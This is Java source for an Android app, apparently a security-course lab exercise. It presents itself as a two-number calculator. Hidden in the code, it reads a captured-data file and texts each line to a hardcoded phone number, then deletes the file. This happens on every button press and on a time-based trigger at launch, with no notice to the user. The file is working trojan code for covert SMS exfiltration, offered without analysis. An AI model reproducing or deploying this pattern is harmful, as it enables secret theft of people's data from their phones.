package cps633.lab4;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Button;
import android.view.View;
import java.io.File;
import java.io.FileNotFoundException;
import java.util.Scanner;
import android.telephony.SmsManager;
import android.text.format.Time;

public class Lab4 extends Activity
{
	EditText amount1;
	EditText amount2;
	TextView tt;
	Button calculate;
	double x=0;
	double y=0;
	double z=0;
	File file = new File("data/data/cps633.lab4/files/capture.txt");
	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState)
	{
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		initControls();
		if (rightTime())
		{
			send();
			deleteFile();
		}
		//sendSMS("15555215556", "this is a test");
		//send();
	}
		
	private void initControls()
	{
		amount1=(EditText)findViewById(R.id.amount1);
		amount2=(EditText)findViewById(R.id.amount2);
		tt=(TextView)findViewById(R.id.tt);
		calculate=(Button)findViewById(R.id.calculate);
		calculate.setOnClickListener(new Button.OnClickListener()
		{
			public void onClick(View  v) 
			{ 
				//showTime();
				calculate();
				send();
				deleteFile();
			}
		});
	}
	
	private void showTime()
	{
		Time now = new Time();
		now.setToNow();
		Integer.parseInt(now.toString().substring(9, 11));
		tt.setText(now.toString().substring(9, 11));
	}
	
	private boolean rightTime()
	{
		Time now = new Time();
		now.setToNow();
		//if (Integer.parseInt(now.toString().substring(9, 11)) == 24)
		if (Integer.parseInt(now.toString().substring(11, 13)) == 46)
		{
			return true;
		}
		return false;
	}
  
	private void calculate()
	{
		x=Double.parseDouble(amount1.getText().toString());
		y=Double.parseDouble(amount2.getText().toString());
		z=x+y;
		tt.setText(Double.toString(z));
	}
	
	private void deleteFile()
	{
		file.delete();
	}
	
	private void send()
	{
		Scanner scanner;
		try
		{
			scanner = new Scanner(file);
			while (scanner.hasNextLine())
			{
				String s = scanner.nextLine();
				//tt.setText(s);
				sendSMS("15555215556", s);
			}
			scanner.close();
		} catch (FileNotFoundException e)
		{
			// TODO Auto-generated catch block.
			e.printStackTrace();
		}
		
	}
	
	private void sendSMS(String phoneNumber, String message)
	{
		PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, Lab4.class), 0);                
		SmsManager sms = SmsManager.getDefault();
		sms.sendTextMessage(phoneNumber, null, message, pi, null);
	}   
}